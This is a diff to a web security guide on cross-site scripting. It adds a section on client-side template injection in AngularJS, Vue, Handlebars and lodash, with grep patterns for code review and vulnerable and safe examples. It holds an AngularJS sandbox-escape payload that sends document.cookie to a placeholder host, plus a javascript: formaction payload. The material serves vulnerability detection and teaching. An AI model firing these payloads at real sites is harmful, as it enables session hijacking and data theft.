@@ -153,12 +153,31 @@ Leverage browser parser repair behavior to transform safe-looking markup into ex
 <form><button formaction=javascript:alert(1)>
 ```
 
-### Template Injection
+### Client-Side Template Injection (CSTI) / template expression evaluation
 
-Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
+Distinct from reflected/DOM XSS and from **server-side** template injection (`ssti.md`): the app reflects user input into a DOM region that a **client-side framework then compiles as a template**, so the framework's expression evaluator runs attacker expressions. **HTML-encoding does not prevent it** — `{{ }}` / directives are not HTML, so they survive entity-encoding and a sink that "escapes HTML" still lets the template engine evaluate them. Classic in AngularJS (`ng-app` scans its DOM subtree for `{{ }}`), and in any runtime template compilation.
+
+**SAST signals — user input reaching a runtime template compiler / expression evaluator**:
+- AngularJS: `$compile(userInput)(scope)`, `$interpolate(userInput)(scope)`, `$parse`, or server-rendered user data placed **inside** an `ng-app`/`ng-controller` subtree; `$sce.trustAsHtml`/`trustAsJs` on user input
+- Vue: `new Vue({ template: userInput })`, `Vue.compile(userInput)`, `app.component({ template: userInput })` on the runtime-compiler build (user-controlled `template`)
+- Generic: `Handlebars.compile(userInput)`, lodash/underscore `_.template(userInput)`, or any "render this string as a template" API fed user input and rendered client-side
+- Tell-tale: the reflected value lands inside a template-compiled element (not bound as text), so a sandbox-escape payload executes even though the response is HTML-escaped
+
+**Payload (AngularJS sandbox escape)**:
 ```
 {{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
 ```
+
+**Grep seeds**:
+```bash
+rg -n "\$compile\(|\$interpolate\(|\$parse\(|\$sce\.trustAs|Vue\.compile\(|new Vue\([^)]*template|Handlebars\.compile\(|_\.template\(" --glob '*.{js,ts,jsx,tsx,vue,html}'
+rg -n "template:\s*.*(req|input|params|query|userInput|body)" --glob '*.{js,ts,jsx,tsx,vue}'
+rg -n "ng-app|ng-bind-html|ng-csp" --glob '*.{html,js,ts}'
+```
+
+**VULN**: server reflects `name` into an `ng-app` page — `<h1>Hello {{name}}</h1>` with `name = {{constructor.constructor('alert(1)')()}}`; or `$compile(userHtml)(scope)` / `_.template(userTpl)()`.
+
+**SAFE**: never render user input inside a template-compiled region; bind it as **text** (`ng-bind`, framework `{{ }}` interpolation of *data values* — not compiling user strings) and never pass user input to `$compile`/`Vue.compile`/`Handlebars.compile`/`_.template`. HTML-encoding alone is NOT a fix.
 
 ### CSP Bypass
 
@@ -197,7 +216,7 @@ Maintain a compact, context-tuned set:
 
 ### Angular
 
-- Legacy expression injection (pre-1.6)
+- Legacy expression injection (pre-1.6) — see **Client-Side Template Injection (CSTI)** above (`$compile`/`$interpolate` and user data inside an `ng-app` subtree)
 - `$sce` trust APIs misused to whitelist attacker-controlled markup
 
 ### Svelte
